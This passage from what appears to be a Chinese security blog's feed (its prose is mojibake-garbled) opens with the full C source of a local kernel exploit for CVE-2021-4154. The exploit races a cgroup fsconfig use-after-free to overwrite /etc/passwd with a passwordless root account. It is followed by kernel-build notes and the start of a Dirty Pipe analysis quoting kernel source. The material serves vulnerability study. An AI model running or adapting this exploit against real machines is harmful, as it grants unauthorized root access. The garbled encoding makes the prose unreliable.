class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kcmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;crypt.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FILE_NUM 1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_NUM 0x40000</span><br><br><span class="hljs-type">int</span> tmp_fd, uaf_fd, fscontext_fd, victim_fd;<br><span class="hljs-type">int</span> target_fd[FILE_NUM];<br><span class="hljs-type">pid_t</span> fork_fd;<br><span class="hljs-type">pthread_t</span> large_write_thread, passwd_write_thread;<br><span class="hljs-type">int</span> flag = <span class="hljs-number">0</span>, large_write_flag = <span class="hljs-number">0</span>, passwd_write_flag;<br><span class="hljs-type">size_t</span> start_addr = <span class="hljs-number">0x114514000</span>;<br><span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_namespace</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">char</span> buff[<span class="hljs-number">0x100</span>];<br><br>    <span class="hljs-type">uid_t</span> uid = getuid();<br>    <span class="hljs-type">gid_t</span> gid = getgid();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] init namespace&quot;</span>);<br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWUSER | CLONE_NEWNS)) &#123;<br>        err_exit(<span class="hljs-string">&quot;unshare(CLONE_NEWUSER | CLONE_NEWNS)&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNET)) &#123;<br>        err_exit(<span class="hljs-string">&quot;unshare(CLONE_NEWNET)&quot;</span>);<br>    &#125;<br><br>    fd = open(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(buff, <span class="hljs-keyword">sizeof</span>(buff), <span class="hljs-string">&quot;deny&quot;</span>);<br>    write(fd, buff, <span class="hljs-built_in">strlen</span>(buff));<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(buff, <span class="hljs-keyword">sizeof</span>(buff), <span class="hljs-string">&quot;0 %d 1&quot;</span>, uid);<br>    write(fd, buff, <span class="hljs-built_in">strlen</span>(buff));<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(buff, <span class="hljs-keyword">sizeof</span>(buff), <span class="hljs-string">&quot;0 %d 1&quot;</span>, gid);<br>    write(fd, buff, <span class="hljs-built_in">strlen</span>(buff));<br>    close(fd);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_dir</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] create exp_dir&quot;</span>);<br>    system(<span class="hljs-string">&quot;rm -rf exp_dir&quot;</span>);<br>    system(<span class="hljs-string">&quot;mkdir exp_dir&quot;</span>);<br>    system(<span class="hljs-string">&quot;touch exp_dir/data&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod -R 777 exp_dir/&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_uaf</span><span class="hljs-params">()</span><br>&#123;   <br>    system(<span class="hljs-string">&quot;cd exp_dir&quot;</span>);<br>    system(<span class="hljs-string">&quot;ln -s data exp_dir/uaf&quot;</span>);<br>    system(<span class="hljs-string">&quot;cd ../&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] prepare create uaf&quot;</span>);<br>    fscontext_fd = syscall(__NR_fsopen, <span class="hljs-string">&quot;cgroup&quot;</span>, FSOPEN_CLOEXEC);<br>    <span class="hljs-keyword">if</span> (fscontext_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;fsopen failed!&quot;</span>);<br><br>    uaf_fd = open(<span class="hljs-string">&quot;exp_dir/uaf&quot;</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (uaf_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open uaf failed!&quot;</span>);<br>    <br>    syscall(__NR_fsconfig, fscontext_fd, FSCONFIG_SET_FD, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-literal">NULL</span>, uaf_fd);<br>    close(fscontext_fd);<br>&#125;<br><br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">large_write</span><span class="hljs-params">()</span><br>&#123;<br>    tmp_fd = open(<span class="hljs-string">&quot;exp_dir/uaf&quot;</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (tmp_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open tmp failed!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] mmap 1G size data&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PAGE_NUM; i++)<br>    &#123;<br>        <span class="hljs-type">void</span> * ret = mmap((<span class="hljs-type">void</span>*)start_addr + <span class="hljs-number">0x1000</span>*i , <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!ret)<br>            err_exit(<span class="hljs-string">&quot;mmap failed!&quot;</span>);<br>    &#125;<br>    <br>    large_write_flag = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (write(tmp_fd, start_addr, <span class="hljs-number">0x1000</span>*(PAGE_NUM<span class="hljs-number">-1</span>)) &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;large write failed!&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] large write success!&quot;</span>);<br>    close(tmp_fd);<br>&#125;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">passwd_write</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> passwd[<span class="hljs-number">1024</span>] = <span class="hljs-string">&quot;shell::0:0:root:/root:/bin/bash\n&quot;</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] try to overwrite /etc/passwd&quot;</span>);<br>    <span class="hljs-keyword">while</span> (!large_write_flag) &#123;&#125;<br><br>    passwd_write_flag = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (write(uaf_fd, passwd, <span class="hljs-built_in">strlen</span>(passwd)) &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;overwrite /etc/passwd failed!&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] overwrite /etc/passwd success&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">file_struct_spray</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (!passwd_write_flag) &#123;&#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] start try to hit uaf file struct&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; FILE_NUM; i++)<br>    &#123;<br>        target_fd[i] = open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, O_RDONLY);<br>        <span class="hljs-keyword">if</span> (target_fd[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;failed at %d target file\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;failed!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, target_fd[i]) == <span class="hljs-number">0</span>)<br>        &#123;<br>            victim_fd = target_fd[i];<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] victim_fd is %d\n&quot;</span>, victim_fd);<br>            flag = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++)<br>                close(target_fd[i]);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!flag)<br>        err_exit(<span class="hljs-string">&quot;failed to find victim_fd&quot;</span>);<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[], <span class="hljs-type">char</span> * envp[])</span><br>&#123;   <br><br>    init_namespace();<br>    create_dir();<br>    <br>    create_uaf();<br><br>    pthread_create(&amp;large_write_thread, <span class="hljs-literal">NULL</span>, large_write, <span class="hljs-literal">NULL</span>);<br>    usleep(<span class="hljs-number">1</span>);<br>    pthread_create(&amp;passwd_write_thread, <span class="hljs-literal">NULL</span>, passwd_write, <span class="hljs-literal">NULL</span>);<br><br>    file_struct_spray();<br><br>    pthread_exit(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆåœ¨çœŸæœºä¸­çš„è¿è¡Œæ•ˆæœ</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240405192649.png"></p><p><del>ä¸ç”¨æ³„éœ²åœ°å€ï¼ŒçœŸçš„å°±åƒğŸå‡ºæ¥ä¸€æ ·çˆ½å•Š</del></p><h1 id="some-thricks"><a href="#some-thricks" class="headerlink" title="some thricks"></a>some thricks</h1><p>è™½ç„¶ç¬”è€…åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­æäº†ä¸€ç§æ¯”è¾ƒæ–¹ä¾¿çš„æ›¿æ¢å¤ç°ç¯å¢ƒå†…æ ¸çš„æ–¹æ³•ï¼Œä½†æ˜¯å§ï¼Œè¿˜æ˜¯ä¼šé‡åˆ°è®¸å¤šé—®é¢˜ã€‚</p><p>å°±åƒç¬”è€…è¿™æ¬¡è¯•äº†5.4å’Œ5.8çš„äº”å…­ä¸ªgenericç‰ˆæœ¬ï¼Œè¦ä¹ˆå°±æ˜¯patchäº†CVEï¼Œè¦ä¹ˆå°±æ˜¯ä¸èƒ½ç¨³å®šè¿è¡Œï¼ˆå¤§æ¦‚åæ¬¡åªèƒ½æˆåŠŸä¸€æ¬¡ï¼Œè€Œä¸”æœ‰æ—¶å€™è¦†å†™çš„dataä¸€å˜å°±8è¡Œäº†ï¼‰æ‰€ä»¥ç¬”è€…è¿˜æ˜¯å›å½’äº†æœ€åŸå§‹çš„æ–¹æ³•ï¼Œç›´æ¥æœ¬åœ°ç¼–è¯‘ä¸€ä¸ªæ›¿æ¢</p><p>å…ˆæŠŠæºç æ”¾åˆ°&#x2F;usr&#x2F;srcä¸‹ï¼Œè§£å‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> ~/linux-5.8.tar.gz /usr/src<br><span class="hljs-built_in">cd</span> /usr/src<br>tar -xf ./linux-5.8.tar.gz<br><span class="hljs-built_in">cd</span> ./linux-5.8<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make menuconfig<span class="hljs-comment">#é»˜è®¤é€‰é¡¹ï¼Œç›´æ¥é€€å‡ºå°±è¡Œ</span><br>make all -j8    <span class="hljs-comment">#æ—¶é—´å¯èƒ½ä¼šæ¯”è¾ƒé•¿</span><br></code></pre></td></tr></table></figure><p>ç¼–è¯‘æ¨¡å—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make INSTALL_MOD_STRIP=1 modules_install <span class="hljs-comment">#ä¹Ÿå¯ä»¥ä¸åŠ INSTALL_MOD_STRIP=1ï¼Œä½†æ˜¯é¼ é¼ ä¸èƒ½ä¿è¯å¯åŠ¨åœ°æ—¶å€™åŠ è½½600å¤šMBçš„inidä¸ä¼šå¡æ­»å‘¦ğŸ˜‹</span><br>make install<br></code></pre></td></tr></table></figure><p>æ›´æ–°gurbå¹¶é‡å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">update-grub<br>reboot<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯è¿›å…¥é«˜çº§æ¨¡å¼é€‰æ‹©5.8ç‰ˆæœ¬çš„å†…æ ¸å¯åŠ¨å•¦</p><h1 id="0xffï¼šå†™åœ¨æœ€åçš„æœ€å"><a href="#0xffï¼šå†™åœ¨æœ€åçš„æœ€å" class="headerlink" title="0xffï¼šå†™åœ¨æœ€åçš„æœ€å"></a>0xffï¼šå†™åœ¨æœ€åçš„æœ€å</h1><p>ç¬”è€…ä¸ºäº†å›¾çœäº‹ï¼Œåœ¨æœ€åç”¨äº†<code>dirtycred</code>å®Œæˆäº†ææƒ</p><p>ä½†æ˜¯ä½œä¸ºä¸€ä¸ª21å¹´çš„CVEï¼ŒåŸæœ¬çš„expå…¶å®é‡‡ç”¨äº†<strong>CROSS-CACHE OVERFLOW</strong>è¿™ä¸€æ‰‹æ³•å®Œæˆåˆ©ç”¨</p><p>ä¸»è¦æ˜¯é“¸å¸ç¬”è€…å®åœ¨ä¸æ˜¯å¾ˆç”¨çš„æ˜ç™½<strong>CROSS-CHACHE OVERFLOW</strong>ï¼Œæ‰€ä»¥ç›´æ¥é€ƒè¯¾äº†ğŸ˜‹</p><p>ä½†ä¼°è®¡æ¥ä¸‹æ¥ç¬”è€…ä¼šå†™ä¸ªä¸“é¢˜ä¸“é—¨ç»ƒç»ƒğŸ‘ŠğŸ‘ŠğŸ‘Š</p><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><p><a href="https://blingblingxuanxuan.github.io/2023/05/19/230518-cve-2021-4154">https://blingblingxuanxuan.github.io/2023/05/19/230518-cve-2021-4154</a></p><p><a href="https://zhuanlan.zhihu.com/p/93592262">æ–°ä¸€ä»£mountç³»ç»Ÿè°ƒç”¨(1)â€”â€”æ¥å£åˆæ¢ - çŸ¥ä¹ (zhihu.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-0847ï¼ˆDirty Pipe) Remake</title>
    <link href="/2024/03/18/dirtypipe/"/>
    <url>/2024/03/18/dirtypipe/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰"><a href="#0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰" class="headerlink" title="0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰"></a>0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰</h1><p><strong>Dirty</strong>ç³»åˆ—ç¬¬äºŒå¼¹</p><p>å› ä¸ºè¯¥æ¼æ´å‘ç°åœ¨å¯¹ç®¡é“å†™å…¥æ•°æ®åï¼Œè¯»å–å®Œæ¯•åæœªæ¸…ç©º<code>pipe_buffer-&gt;flags</code>ï¼Œé€ æˆè¶Šæƒå†™å…¥åªè¯»æ–‡ä»¶</p><p>å’Œ<strong>Dirty Cow</strong>å¾ˆåƒï¼Œå› æ­¤è¢«å† ä»¥<strong>Dirty Pipe</strong>çš„ç§°å‘¼</p><p>ä½†æ˜¯å’Œ<strong>Dirty Cow</strong>éœ€è¦çº¿ç¨‹ç«äº‰ç›¸æ¯”ï¼Œ<strong>Dirty Pipe</strong>ç¨³å®šè®¸å¤š</p><p>PSï¼šä¸‹æ–‡æ‰€æœ‰æºç çš„ç‰ˆæœ¬ä¸º 5.8</p><h1 id="0x01ï¼šä¿¡æ¯æ”¶é›†"><a href="#0x01ï¼šä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01ï¼šä¿¡æ¯æ”¶é›†"></a>0x01ï¼šä¿¡æ¯æ”¶é›†</h1><p><a href="https://nvd.nist.gov/vuln/detail/cve-2022-0847">NVD - cve-2022-0847 (nist.gov)</a></p><p>å½±å“ç‰ˆæœ¬ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321231636.png"></p><h1 id="0x02ï¼šå‰ç½®çŸ¥è¯†"><a href="#0x02ï¼šå‰ç½®çŸ¥è¯†" class="headerlink" title="0x02ï¼šå‰ç½®çŸ¥è¯†"></a>0x02ï¼šå‰ç½®çŸ¥è¯†</h1><h2 id="ä½•ä¸ºå¯¼ç®¡ğŸ¤”"><a href="#ä½•ä¸ºå¯¼ç®¡ğŸ¤”" class="headerlink" title="ä½•ä¸ºå¯¼ç®¡ğŸ¤”"></a>ä½•ä¸ºå¯¼ç®¡ğŸ¤”</h2><p>ä½•ä¸ºç®¡é“ï¼Ÿå¥½é—®é¢˜ï¼Œæ‰€è°“ç®¡é“ï¼Œå°±æ˜¯è¿æ¥ä¸€ä¸ªå†™è¿›ç¨‹ä¸ä¸€ä¸ªè¯»è¿›ç¨‹ï¼Œç”¨äºä¸¤è¿›ç¨‹é—´é€šä¿¡çš„å…±äº«æ–‡ä»¶ï¼Œåˆç§°<code>pipe</code>æ–‡ä»¶</p><p>å‘ç®¡é“ï¼ˆå…±äº«æ–‡ä»¶ï¼‰æä¾›è¾“å…¥çš„å‘é€è¿›ç¨‹ï¼ˆå³å†™è¿›ç¨‹ï¼‰ï¼Œä»¥å­—ç¬¦æµå½¢å¼å°†å¤§é‡çš„æ•°æ®é€å…¥ç®¡é“ï¼›è€Œæ¥æ”¶ç®¡é“è¾“å‡ºçš„æ¥æ”¶è¿›ç¨‹ï¼ˆå³è¯»è¿›ç¨‹ï¼‰ï¼Œå¯ä»ç®¡é“ä¸­æ¥æ”¶æ•°æ®ã€‚ç”±äºå‘é€è¿›ç¨‹å’Œæ¥æ”¶è¿›ç¨‹æ˜¯åˆ©ç”¨ç®¡é“è¿›è¡Œé€šä¿¡çš„ï¼Œæ•…åˆç§°ç®¡é“é€šä¿¡ã€‚</p><p>ä¸ºäº†åè°ƒåŒæ–¹çš„é€šä¿¡ï¼Œç®¡é“é€šä¿¡æœºåˆ¶å¿…é¡»æä¾›ä»¥ä¸‹3 æ–¹é¢çš„åè°ƒèƒ½åŠ›ã€‚</p><ul><li>äº’æ–¥ã€‚å½“ä¸€ä¸ªè¿›ç¨‹æ­£åœ¨å¯¹ <code>pipe</code> è¿›è¡Œè¯»&#x2F;å†™æ“ä½œæ—¶ï¼Œå¦ä¸€ä¸ªè¿›ç¨‹å¿…é¡»ç­‰å¾…ã€‚</li><li>åŒæ­¥ã€‚å½“å†™ï¼ˆè¾“å…¥ï¼‰è¿›ç¨‹æŠŠä¸€å®šæ•°é‡ï¼ˆå¦‚4KBï¼‰æ•°æ®å†™å…¥ pipe åï¼Œä¾¿å»ç¡çœ ç­‰å¾…ï¼Œç›´åˆ°è¯»ï¼ˆè¾“å‡ºï¼‰è¿›ç¨‹å–èµ°æ•°æ®åï¼Œå†æŠŠå®ƒå”¤é†’ã€‚å½“è¯»è¿›ç¨‹è¯»åˆ°ä¸€ç©º <code>pipe</code> æ—¶ï¼Œä¹Ÿåº”ç¡çœ ç­‰å¾…ï¼Œç›´è‡³å†™è¿›ç¨‹å°†æ•°æ®å†™å…¥ç®¡é“åï¼Œæ‰å°†å®ƒå”¤é†’ã€‚</li><li>å¯¹æ–¹æ˜¯å¦å­˜åœ¨ã€‚åªæœ‰ç¡®å®šå¯¹æ–¹å·²å­˜åœ¨æ—¶ï¼Œæ‰èƒ½è¿›è¡Œé€šä¿¡ã€‚</li></ul><h2 id="pipe-ã®-è°ƒç”¨é“¾"><a href="#pipe-ã®-è°ƒç”¨é“¾" class="headerlink" title="pipe ã® è°ƒç”¨é“¾"></a>pipe ã® è°ƒç”¨é“¾</h2><p>æ¥ä¸‹æ¥å°±æ¥çœ‹çœ‹<code>pipe</code>çš„å®ç°è¿‡ç¨‹</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">do_pipe2<br>__do_pipe_flags<br>create_pipe_files<br>get_pipe_inode<br>alloc_pipe_info<br></code></pre></td></tr></table></figure><h3 id="do-pipe2"><a href="#do-pipe2" class="headerlink" title="do_pipe2"></a>do_pipe2</h3><p><code>pipe</code>å’Œ<code>pipe2</code>éƒ½æ˜¯ç³»ç»Ÿè°ƒç”¨ï¼Œéƒ½æ˜¯<code>do_pipe2</code>çš„å¥—å¨ƒï¼Œä¸åŒçš„æ˜¯ï¼Œ<code>pipe2</code>èƒ½è‡ªå·±æŒ‡å®š<code>flags</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C">SYSCALL_DEFINE2(pipe2, <span class="hljs-type">int</span> __user *, fildes, <span class="hljs-type">int</span>, flags)<br>&#123;<br><span class="hljs-keyword">return</span> do_pipe2(fildes, flags);<br>&#125;<br><br>SYSCALL_DEFINE1(pipe, <span class="hljs-type">int</span> __user *, fildes)<br>&#123;<br><span class="hljs-keyword">return</span> do_pipe2(fildes, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sys_pipe() is the normal C calling standard for creating</span><br><span class="hljs-comment"> * a pipe. It&#x27;s not the way Unix traditionally does this, though.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//fildes æ˜¯ä¸€ä¸ªæŒ‡å‘æ•´æ•°æ•°ç»„çš„æŒ‡é’ˆï¼Œç”¨äºå­˜å‚¨ç®¡é“ç«¯ç‚¹çš„æ–‡ä»¶æè¿°ç¬¦</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_pipe2</span><span class="hljs-params">(<span class="hljs-type">int</span> __user *fildes, <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">files</span>[2];</span><br><span class="hljs-type">int</span> fd[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> error;<br><span class="hljs-comment">//æ ¸å¿ƒå‡½æ•°ï¼šè¿™ä¸ªå‡½æ•°é¢„è®¡ä¼šåˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œå¹¶è¿”å›ç›¸åº”çš„æ–‡ä»¶æè¿°ç¬¦å’Œæ–‡ä»¶æŒ‡é’ˆæ•°ç»„ã€‚å¦‚æœè°ƒç”¨æˆåŠŸï¼Œè¿”å›å€¼ä¸º0</span><br>error = __do_pipe_flags(fd, files, flags);<br><span class="hljs-keyword">if</span> (!error) &#123;<br><span class="hljs-keyword">if</span> (unlikely(copy_to_user(fildes, fd, <span class="hljs-keyword">sizeof</span>(fd)))) &#123;<br>fput(files[<span class="hljs-number">0</span>]);<br>fput(files[<span class="hljs-number">1</span>]);<br>put_unused_fd(fd[<span class="hljs-number">0</span>]);<br>put_unused_fd(fd[<span class="hljs-number">1</span>]);<br>error = -EFAULT;<br>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//copy_to_user æˆåŠŸï¼Œé‚£ä¹ˆå®ƒå°†é€šè¿‡ fd_install å°†æ–‡ä»¶æè¿°ç¬¦å®‰è£…åˆ°å†…æ ¸ä¸­ï¼Œä»¥ä¾¿ç”¨æˆ·ç©ºé—´å¯ä»¥é€šè¿‡è¿™äº›æ–‡ä»¶æè¿°ç¬¦è®¿é—®ç®¡é“ã€‚</span><br>fd_install(fd[<span class="hljs-number">0</span>], files[<span class="hljs-number">0</span>]);<br>fd_install(fd[<span class="hljs-number">1</span>], files[<span class="hljs-number">1</span>]);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="do-pipe-flags"><a href="#do-pipe-flags" class="headerlink" title="__do_pipe_flags"></a>__do_pipe_flags</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __do_pipe_flags(<span class="hljs-type">int</span> *fd, <span class="hljs-keyword">struct</span> file **files, <span class="hljs-type">int</span> flags)<br>&#123;<br><span class="hljs-type">int</span> error;<br><span class="hljs-type">int</span> fdw, fdr;<br><br><span class="hljs-keyword">if</span> (flags &amp; ~(O_CLOEXEC | O_NONBLOCK | O_DIRECT | O_NOTIFICATION_PIPE))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>error = create_pipe_files(files, flags);<span class="hljs-comment">//æ ¸å¿ƒå‡½æ•°ï¼šæ¥åˆ›å»ºç®¡é“çš„æ–‡ä»¶å¯¹è±¡</span><br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">return</span> error;<br><br>    <span class="hljs-comment">//ä¸¤æ¬¡æ¥è·å–æœªä½¿ç”¨çš„æ–‡ä»¶æè¿°ç¬¦ã€‚å¦‚æœè·å–å¤±è´¥ï¼Œåˆ™è·³è½¬åˆ°é”™è¯¯å¤„ç†éƒ¨åˆ†ã€‚</span><br>error = get_unused_fd_flags(flags);<br><span class="hljs-keyword">if</span> (error &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_read_pipe;<br>fdr = error;<br><br>error = get_unused_fd_flags(flags);<br><span class="hljs-keyword">if</span> (error &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fdr;<br>fdw = error;<br><br>audit_fd_pair(fdr, fdw);<span class="hljs-comment">//è®°å½•æ–‡ä»¶æè¿°ç¬¦çš„é…å¯¹æƒ…å†µ</span><br>fd[<span class="hljs-number">0</span>] = fdr;<br>fd[<span class="hljs-number">1</span>] = fdw;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br> err_fdr:<br>put_unused_fd(fdr);<br> err_read_pipe:<br>fput(files[<span class="hljs-number">0</span>]);<br>fput(files[<span class="hljs-number">1</span>]);<br><span class="hljs-keyword">return</span> error;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="create-pipe-files"><a href="#create-pipe-files" class="headerlink" title="create_pipe_files"></a>create_pipe_files</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 